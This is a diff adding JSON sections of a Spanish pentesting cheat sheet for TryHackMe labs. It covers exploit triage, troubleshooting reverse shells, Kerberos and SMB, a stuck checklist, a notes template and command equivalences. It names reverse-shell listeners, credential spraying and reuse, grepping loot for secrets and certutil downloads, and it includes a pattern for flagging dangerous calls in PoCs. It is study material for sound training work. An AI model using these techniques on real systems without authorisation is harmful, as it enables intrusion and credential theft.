+      "searchText": "CVE y exploits Usar PoCs sin ejecutar basura a ciegas. Pregunta Decision Coincide producto exacto? Si no, baja prioridad. Coincide rango de version? Si esta fuera, descarta o busca config concreta. Requiere credenciales? Separar pre-auth de post-auth. Requiere admin? Solo sirve si ya tienes ese rol. Es destructivo? Evitar DoS/wipers salvo que el lab lo pida claramente. searchsploit PRODUCT VERSION sed -n '1,220p' exploit.py grep -nEi 'rm|del|format|shutdown|useradd|chmod|curl|wget|socket|subprocess' exploit.py python3 exploit.py -h python3 exploit.py --check --url $URL Primero reproduce la peticion minima con curl/Burp. Cambia payloads por comandos inocuos: id, whoami, hostname. Guarda fuente, version detectada, cambios hechos y output de exito."
+    },
+    {
+      "id": "section-16",
+      "order": 16,
+      "slug": "errores-tipicos",
+      "title": "Errores tipicos",
+      "summary": "Problemas frecuentes en THM y como desbloquearlos rapido.",
+      "phase": "enumeration",
+      "tags": [
+        "workflow"
+      ],
+      "commands": [],
+      "tables": [
+        [
+          "Sintoma",
+          "Causa probable",
+          "Que probar"
+        ],
+        [
+          "No responde ping",
+          "ICMP filtrado o VPN rara.",
+          "Usar nmap -Pn; comprobar tun0/VPN; reiniciar target si THM va lento."
+        ],
+        [
+          "nmap ve pocos puertos",
+          "Rate alto, host filtrando o escaneo incompleto.",
+          "Repetir con -Pn, bajar --min-rate, probar top ports UDP si aplica."
+        ],
+        [
+          "ffuf devuelve todo 200",
+          "Wildcard o pagina catch-all.",
+          "Filtrar con -fs, -fw, -fl; comparar una ruta aleatoria inexistente."
+        ],
+        [
+          "vhost no aparece",
+          "Host header incorrecto o falta /etc/hosts.",
+          "Anadir dominio a /etc/hosts; usar -H 'Host: FUZZ.dominio'."
+        ],
+        [
+          "Reverse shell no llega",
+          "LHOST mal, VPN IP incorrecta, firewall o puerto ocupado.",
+          "Usar ip a/tun0; nc -lvnp; probar curl desde victima a tu HTTP."
+        ],
+        [
+          "Shell se corta",
+          "TTY inestable o comando interactivo.",
+          "Estabilizar con python pty, stty raw -echo, TERM=xterm."
+        ],
+        [
+          "smbclient ACCESS_DENIED",
+          "Formato de usuario/dominio o permisos insuficientes.",
+          "Probar -N, Guest, DOMAIN/user, user%pass, smbmap y nxc."
+        ],
+        [
+          "Kerberos KRB_AP_ERR_SKEW",
+          "Hora desincronizada.",
+          "Sincronizar hora con DC; comprobar timezone; usar FQDN correcto."
+        ],
+        [
+          "Cannot find KDC",
+          "DNS/hosts/realm mal.",
+          "Anadir DC_FQDN y dominio a /etc/hosts; revisar DOMAIN en mayus/minus."
+        ],
+        [
+          "evil-winrm falla",
+          "Puerto cerrado, formato usuario o cred invalida.",
+          "nxc winrm $IP -u USER -p PASS; probar DOMAIN\\USER; revisar 5985/5986."
+        ],
+        [
+          "SQLMap no detecta nada",
+          "Request incompleta, parametro no vulnerable o WAF/filtro.",
+          "Usar -r desde Burp, marcar parametro con *, subir level/risk con cuidado."
+        ],
+        [
+          "PoC no funciona",
+          "Version/config no coincide o requiere auth.",
+          "Leer PoC, confirmar precondiciones, reproducir peticion minima con curl/Burp."
+        ]
+      ],
+      "blocks": [
+        [
+          "p",
+          "Cuando algo falla, primero distingue si el problema es de conectividad, nombre/dominio, autenticacion, herramienta o interpretacion del resultado. Esta tabla es para salir del bucle rapido."
+        ],
+        [
+          "table",
+          [
+            [
+              "Sintoma",
+              "Causa probable",
+              "Que probar"
+            ],
+            [
+              "No responde ping",
+              "ICMP filtrado o VPN rara.",
+              "Usar nmap -Pn; comprobar tun0/VPN; reiniciar target si THM va lento."
+            ],
+            [
+              "nmap ve pocos puertos",
+              "Rate alto, host filtrando o escaneo incompleto.",
+              "Repetir con -Pn, bajar --min-rate, probar top ports UDP si aplica."
+            ],
+            [
+              "ffuf devuelve todo 200",
+              "Wildcard o pagina catch-all.",
+              "Filtrar con -fs, -fw, -fl; comparar una ruta aleatoria inexistente."
+            ],
+            [
+              "vhost no aparece",
+              "Host header incorrecto o falta /etc/hosts.",
+              "Anadir dominio a /etc/hosts; usar -H 'Host: FUZZ.dominio'."
+            ],
+            [
+              "Reverse shell no llega",
+              "LHOST mal, VPN IP incorrecta, firewall o puerto ocupado.",
+              "Usar ip a/tun0; nc -lvnp; probar curl desde victima a tu HTTP."
+            ],
+            [
+              "Shell se corta",
+              "TTY inestable o comando interactivo.",
+              "Estabilizar con python pty, stty raw -echo, TERM=xterm."
+            ],
+            [
+              "smbclient ACCESS_DENIED",
+              "Formato de usuario/dominio o permisos insuficientes.",
+              "Probar -N, Guest, DOMAIN/user, user%pass, smbmap y nxc."
+            ],
+            [
+              "Kerberos KRB_AP_ERR_SKEW",
+              "Hora desincronizada.",
+              "Sincronizar hora con DC; comprobar timezone; usar FQDN correcto."
+            ],
+            [
+              "Cannot find KDC",
+              "DNS/hosts/realm mal.",
+              "Anadir DC_FQDN y dominio a /etc/hosts; revisar DOMAIN en mayus/minus."
+            ],
+            [
+              "evil-winrm falla",
+              "Puerto cerrado, formato usuario o cred invalida.",
+              "nxc winrm $IP -u USER -p PASS; probar DOMAIN\\USER; revisar 5985/5986."
+            ],
+            [
+              "SQLMap no detecta nada",
+              "Request incompleta, parametro no vulnerable o WAF/filtro.",
+              "Usar -r desde Burp, marcar parametro con *, subir level/risk con cuidado."
+            ],
+            [
+              "PoC no funciona",
+              "Version/config no coincide o requiere auth.",
+              "Leer PoC, confirmar precondiciones, reproducir peticion minima con curl/Burp."
+            ]
+          ],
+          [
+            4.2,
+            4.8,
+            7.2
+          ]
+        ],
+        [
+          "h2",
+          "Regla de oro"
+        ],
+        [
+          "bullets",
+          [
+            "Si una herramienta falla, reproduce la condicion minima con curl, nc, smbclient o nxc.",
+            "Si un servicio depende de nombre, no insistas solo con IP.",
+            "Si una credencial funciona en un sitio, pruebala de forma controlada en los demas servicios."
+          ]
+        ]
+      ],
+      "searchText": "Errores tipicos Problemas frecuentes en THM y como desbloquearlos rapido. Cuando algo falla, primero distingue si el problema es de conectividad, nombre/dominio, autenticacion, herramienta o interpretacion del resultado. Esta tabla es para salir del bucle rapido. Sintoma Causa probable Que probar No responde ping ICMP filtrado o VPN rara. Usar nmap -Pn; comprobar tun0/VPN; reiniciar target si THM va lento. nmap ve pocos puertos Rate alto, host filtrando o escaneo incompleto. Repetir con -Pn, bajar --min-rate, probar top ports UDP si aplica. ffuf devuelve todo 200 Wildcard o pagina catch-all. Filtrar con -fs, -fw, -fl; comparar una ruta aleatoria inexistente. vhost no aparece Host header incorrecto o falta /etc/hosts. Anadir dominio a /etc/hosts; usar -H 'Host: FUZZ.dominio'. Reverse shell no llega LHOST mal, VPN IP incorrecta, firewall o puerto ocupado. Usar ip a/tun0; nc -lvnp; probar curl desde victima a tu HTTP. Shell se corta TTY inestable o comando interactivo. Estabilizar con python pty, stty raw -echo, TERM=xterm. smbclient ACCESS_DENIED Formato de usuario/dominio o permisos insuficientes. Probar -N, Guest, DOMAIN/user, user%pass, smbmap y nxc. Kerberos KRB_AP_ERR_SKEW Hora desincronizada. Sincronizar hora con DC; comprobar timezone; usar FQDN correcto. Cannot find KDC DNS/hosts/realm mal. Anadir DC_FQDN y dominio a /etc/hosts; revisar DOMAIN en mayus/minus. evil-winrm falla Puerto cerrado, formato usuario o cred invalida. nxc winrm $IP -u USER -p PASS; probar DOMAIN\\USER; revisar 5985/5986. SQLMap no detecta nada Request incompleta, parametro no vulnerable o WAF/filtro. Usar -r desde Burp, marcar parametro con *, subir level/risk con cuidado. PoC no funciona Version/config no coincide o requiere auth. Leer PoC, confirmar precondiciones, reproducir peticion minima con curl/Burp. Regla de oro Si una herramienta falla, reproduce la condicion minima con curl, nc, smbclient o nxc. Si un servicio depende de nombre, no insistas solo con IP. Si una credencial funciona en un sitio, pruebala de forma controlada en los demas servicios."
+    },
+    {
+      "id": "section-17",
+      "order": 17,
+      "slug": "checklist-de-atasco",
+      "title": "Checklist de atasco",
+      "summary": "Preguntas para cuando llevas rato sin avanzar.",
+      "phase": "closeout",
+      "tags": [
+        "workflow"
+      ],
+      "commands": [
+        "cat nmap/services.txt",
+        "grep -RniE 'pass|user|key|token|admin' loot web notes 2>/dev/null",
+        "cat notes/creds.md 2>/dev/null",
+        "cat notes/timeline.md 2>/dev/null"
+      ],
+      "tables": [
+        [
+          "Pregunta",
+          "Por que puede desbloquear"
+        ],
+        [
+          "He revisado UDP?",
+          "DNS, SNMP, TFTP o NFS suelen cambiar completamente la room."
+        ],
+        [
+          "He probado vhosts?",
+          "Muchas webs esconden paneles o apps por Host header."
+        ],
+        [
+          "He mirado robots, sitemap, JS y codigo fuente?",
+          "Puede filtrar rutas, endpoints, tokens o comentarios."
+        ],
+        [
+          "Tengo usuarios reales?",
+          "Usuarios reales permiten spraying, AS-REP, Kerberoast o cred reuse."
+        ],
+        [
+          "He reenumerado con nuevas credenciales?",
+          "Una cred valida cambia shares, LDAP, web, sudo, WinRM y DB."
+        ],
+        [
+          "Hay servicios solo en localhost?",
+          "Puede requerir pivot o port forward tras conseguir shell."
+        ],
+        [
+          "He probado cred reuse?",
+          "La misma password puede abrir SSH, SMB, WinRM, panel web, MySQL o sudo."
+        ],
+        [
+          "Estoy usando hostname cuando toca?",
+          "Kerberos, vhosts y apps internas pueden fallar solo por usar IP."
+        ],
+        [
+          "He revisado permisos de escritura?",
+          "Privesc suele venir de scripts, servicios, cron/tareas o configs escribibles."
+        ],
+        [
+          "Estoy siguiendo un falso positivo?",
+          "Vuelve a evidencia: version exacta, respuesta real e impacto claro."
+        ]
+      ],
+      "blocks": [
+        [
+          "p",
+          "No es una lista para hacer siempre; es una lista de rescate. Si estas atascado, vuelve a lo basico y busca una superficie que no hayas reenumerado con la informacion nueva."
+        ],
+        [
+          "table",
+          [
+            [
+              "Pregunta",
+              "Por que puede desbloquear"
+            ],
+            [
+              "He revisado UDP?",
+              "DNS, SNMP, TFTP o NFS suelen cambiar completamente la room."
+            ],
+            [
+              "He probado vhosts?",
+              "Muchas webs esconden paneles o apps por Host header."
+            ],
+            [
+              "He mirado robots, sitemap, JS y codigo fuente?",
+              "Puede filtrar rutas, endpoints, tokens o comentarios."
+            ],
+            [
+              "Tengo usuarios reales?",
+              "Usuarios reales permiten spraying, AS-REP, Kerberoast o cred reuse."
+            ],
+            [
+              "He reenumerado con nuevas credenciales?",
+              "Una cred valida cambia shares, LDAP, web, sudo, WinRM y DB."
+            ],
+            [
+              "Hay servicios solo en localhost?",
+              "Puede requerir pivot o port forward tras conseguir shell."
+            ],
+            [
+              "He probado cred reuse?",
+              "La misma password puede abrir SSH, SMB, WinRM, panel web, MySQL o sudo."
+            ],
+            [
+              "Estoy usando hostname cuando toca?",
+              "Kerberos, vhosts y apps internas pueden fallar solo por usar IP."
+            ],
+            [
+              "He revisado permisos de escritura?",
+              "Privesc suele venir de scripts, servicios, cron/tareas o configs escribibles."
+            ],
+            [
+              "Estoy siguiendo un falso positivo?",
+              "Vuelve a evidencia: version exacta, respuesta real e impacto claro."
+            ]
+          ],
+          [
+            5.2,
+            11.0
+          ]
+        ],
+        [
+          "h2",
+          "Reset de 10 minutos"
+        ],
+        [
+          "code",
+          [
+            "cat nmap/services.txt",
+            "grep -RniE 'pass|user|key|token|admin' loot web notes 2>/dev/null",
+            "cat notes/creds.md 2>/dev/null",
+            "cat notes/timeline.md 2>/dev/null"
+          ]
+        ],
+        [
+          "bullets",
+          [
+            "Escribe en una linea cual es tu mejor hipotesis actual.",
+            "Escribe que evidencia la apoya y que prueba la descartaria.",
+            "Si no puedes responder eso, vuelve a enumeracion, no a exploits."
+          ]
+        ]
+      ],
+      "searchText": "Checklist de atasco Preguntas para cuando llevas rato sin avanzar. No es una lista para hacer siempre; es una lista de rescate. Si estas atascado, vuelve a lo basico y busca una superficie que no hayas reenumerado con la informacion nueva. Pregunta Por que puede desbloquear He revisado UDP? DNS, SNMP, TFTP o NFS suelen cambiar completamente la room. He probado vhosts? Muchas webs esconden paneles o apps por Host header. He mirado robots, sitemap, JS y codigo fuente? Puede filtrar rutas, endpoints, tokens o comentarios. Tengo usuarios reales? Usuarios reales permiten spraying, AS-REP, Kerberoast o cred reuse. He reenumerado con nuevas credenciales? Una cred valida cambia shares, LDAP, web, sudo, WinRM y DB. Hay servicios solo en localhost? Puede requerir pivot o port forward tras conseguir shell. He probado cred reuse? La misma password puede abrir SSH, SMB, WinRM, panel web, MySQL o sudo. Estoy usando hostname cuando toca? Kerberos, vhosts y apps internas pueden fallar solo por usar IP. He revisado permisos de escritura? Privesc suele venir de scripts, servicios, cron/tareas o configs escribibles. Estoy siguiendo un falso positivo? Vuelve a evidencia: version exacta, respuesta real e impacto claro. Reset de 10 minutos cat nmap/services.txt grep -RniE 'pass|user|key|token|admin' loot web notes 2>/dev/null cat notes/creds.md 2>/dev/null cat notes/timeline.md 2>/dev/null Escribe en una linea cual es tu mejor hipotesis actual. Escribe que evidencia la apoya y que prueba la descartaria. Si no puedes responder eso, vuelve a enumeracion, no a exploits."
+    },
+    {
+      "id": "section-18",
+      "order": 18,
+      "slug": "notas-y-cierre",
+      "title": "Notas y cierre",
+      "summary": "Que registrar para no perderte y poder repetir la cadena.",
+      "phase": "closeout",
+      "tags": [
+        "workflow"
+      ],
+      "commands": [
+        "# Room",
+        "- IP:",
+        "- Hostnames:",
+        "- Dominio:",
+        "- Puertos:",
+        "- Credenciales:",
+        "- Hallazgo clave:",
+        "- Acceso inicial:",
+        "- Escalada:",
+        "- Flags:",
+        "- Root cause:"
+      ],
+      "tables": [
+        [
+          "Registro",
+          "Contenido"
+        ],
+        [
+          "Superficie",
+          "Puerto, servicio, version, evidencia y siguiente prueba."
+        ],
+        [
+          "Comando",
+          "Contexto, comando, resultado importante y decision desbloqueada."
+        ],
+        [
+          "Credenciales",
+          "Usuario, password/hash, fuente, servicio probado y resultado."
+        ],
+        [
+          "Hallazgo",
+          "Impacto, precondiciones, pasos reproducibles, evidencia y mitigacion teorica."
+        ],
+        [
+          "Cierre",
+          "Comandos minimos para reproducir user/root y falsos caminos relevantes."
+        ]
+      ],
+      "blocks": [
+        [
+          "h2",
+          "Plantilla minima"
+        ],
+        [
+          "code",
+          [
+            "# Room",
+            "- IP:",
+            "- Hostnames:",
+            "- Dominio:",
+            "- Puertos:",
+            "- Credenciales:",
+            "- Hallazgo clave:",
+            "- Acceso inicial:",
+            "- Escalada:",
+            "- Flags:",
+            "- Root cause:"
+          ]
+        ],
+        [
+          "table",
+          [
+            [
+              "Registro",
+              "Contenido"
+            ],
+            [
+              "Superficie",
+              "Puerto, servicio, version, evidencia y siguiente prueba."
+            ],
+            [
+              "Comando",
+              "Contexto, comando, resultado importante y decision desbloqueada."
+            ],
+            [
+              "Credenciales",
+              "Usuario, password/hash, fuente, servicio probado y resultado."
+            ],
+            [
+              "Hallazgo",
+              "Impacto, precondiciones, pasos reproducibles, evidencia y mitigacion teorica."
+            ],
+            [
+              "Cierre",
+              "Comandos minimos para reproducir user/root y falsos caminos relevantes."
+            ]
+          ],
+          [
+            3.2,
+            13.0
+          ]
+        ]
+      ],
+      "searchText": "Notas y cierre Que registrar para no perderte y poder repetir la cadena. Plantilla minima # Room - IP: - Hostnames: - Dominio: - Puertos: - Credenciales: - Hallazgo clave: - Acceso inicial: - Escalada: - Flags: - Root cause: Registro Contenido Superficie Puerto, servicio, version, evidencia y siguiente prueba. Comando Contexto, comando, resultado importante y decision desbloqueada. Credenciales Usuario, password/hash, fuente, servicio probado y resultado. Hallazgo Impacto, precondiciones, pasos reproducibles, evidencia y mitigacion teorica. Cierre Comandos minimos para reproducir user/root y falsos caminos relevantes."
+    },
+    {
+      "id": "section-19",
+      "order": 19,
+      "slug": "equivalencias",
+      "title": "Equivalencias",
+      "summary": "Traduccion rapida de comandos entre Linux, CMD y PowerShell.",
+      "phase": "enumeration",
+      "tags": [
+        "linux",
+        "windows"
+      ],
+      "commands": [],
+      "tables": [
+        [
+          "Objetivo",
+          "Linux",
+          "CMD",
+          "PowerShell"
+        ],
+        [
+          "Listar",
+          "ls -la",
+          "dir",
+          "Get-ChildItem / ls"
+        ],
+        [
+          "Ver archivo",
+          "cat file",
+          "type file",
+          "Get-Content file"
+        ],
+        [
+          "Copiar",
+          "cp a b",
+          "copy a b",
+          "Copy-Item a b"
+        ],
+        [
+          "Mover",
+          "mv a b",
+          "move a b",
+          "Move-Item a b"
+        ],
+        [
+          "Borrar",
+          "rm file",
+          "del file",
+          "Remove-Item file"
+        ],
+        [
+          "Buscar texto",
+          "grep -R pass .",
+          "findstr /S /I pass *",
+          "Select-String -Pattern pass -Recurse"
+        ],
+        [
+          "Buscar archivo",
+          "find / -name file",
+          "dir /s /b file",
+          "Get-ChildItem -Recurse -Filter file"
+        ],
+        [
+          "Procesos",
+          "ps aux",
+          "tasklist",
+          "Get-Process"
+        ],
+        [
+          "Red",
+          "ip a",
+          "ipconfig /all",
+          "Get-NetIPConfiguration"
+        ],
+        [
+          "Puertos",
+          "ss -tulpen",
+          "netstat -ano",
+          "Get-NetTCPConnection"
+        ],
+        [
+          "Descargar",
+          "wget/curl",
+          "certutil -urlcache -split -f",
+          "Invoke-WebRequest -OutFile"
+        ],
+        [
+          "Hash",
+          "sha256sum file",
+          "certutil -hashfile file SHA256",
+          "Get-FileHash file"
+        ]
+      ],
+      "blocks": [
+        [
+          "table",
+          [
+            [
+              "Objetivo",
+              "Linux",
+              "CMD",
+              "PowerShell"
+            ],
+            [
+              "Listar",
+              "ls -la",
+              "dir",
+              "Get-ChildItem / ls"
+            ],
+            [
+              "Ver archivo",
+              "cat file",
+              "type file",
+              "Get-Content file"
+            ],
+            [
+              "Copiar",
+              "cp a b",
+              "copy a b",
+              "Copy-Item a b"
+            ],
+            [
+              "Mover",
+              "mv a b",
+              "move a b",
+              "Move-Item a b"
+            ],
+            [
+              "Borrar",
+              "rm file",
+              "del file",
+              "Remove-Item file"
+            ],
+            [
+              "Buscar texto",
+              "grep -R pass .",
+              "findstr /S /I pass *",
+              "Select-String -Pattern pass -Recurse"
+            ],
+            [
+              "Buscar archivo",
+              "find / -name file",
+              "dir /s /b file",
+              "Get-ChildItem -Recurse -Filter file"
+            ],
+            [
+              "Procesos",
+              "ps aux",
+              "tasklist",
+              "Get-Process"
+            ],
+            [
+              "Red",
+              "ip a",
+              "ipconfig /all",
+              "Get-NetIPConfiguration"
+            ],
+            [
+              "Puertos",
+              "ss -tulpen",
+              "netstat -ano",
+              "Get-NetTCPConnection"
+            ],
+            [
+              "Descargar",
+              "wget/curl",
+              "certutil -urlcache -split -f",
+              "Invoke-WebRequest -OutFile"
+            ],
+            [
+              "Hash",
+              "sha256sum file",
+              "certutil -hashfile file SHA256",
+              "Get-FileHash file"
+            ]
+          ],
+          [
+            3.3,
+            4.3,
+            4.0,
+            4.6
+          ]
+        ],
+        [
+          "bullets",
+          [
+            "PowerShell acepta alias como ls, cat, cp, mv y rm, pero no siempre se comportan igual que Bash.",
+            "En writeups usa comandos nativos claros cuando quieras reproducibilidad.",
+            "En Windows, rutas con espacios necesitan comillas."
+          ]
+        ]
+      ],
+      "searchText": "Equivalencias Traduccion rapida de comandos entre Linux, CMD y PowerShell. Objetivo Linux CMD PowerShell Listar ls -la dir Get-ChildItem / ls Ver archivo cat file type file Get-Content file Copiar cp a b copy a b Copy-Item a b Mover mv a b move a b Move-Item a b Borrar rm file del file Remove-Item file Buscar texto grep -R pass . findstr /S /I pass * Select-String -Pattern pass -Recurse Buscar archivo find / -name file dir /s /b file Get-ChildItem -Recurse -Filter file Procesos ps aux tasklist Get-Process Red ip a ipconfig /all Get-NetIPConfiguration Puertos ss -tulpen netstat -ano Get-NetTCPConnection Descargar wget/curl certutil -urlcache -split -f Invoke-WebRequest -OutFile Hash sha256sum file certutil -hashfile file SHA256 Get-FileHash file PowerShell acepta alias como ls, cat, cp, mv y rm, pero no siempre se comportan igual que Bash. En writeups usa comandos nativos claros cuando quieras reproducibilidad. En Windows, rutas con espacios necesitan comillas."
+    }
+  ]
+}
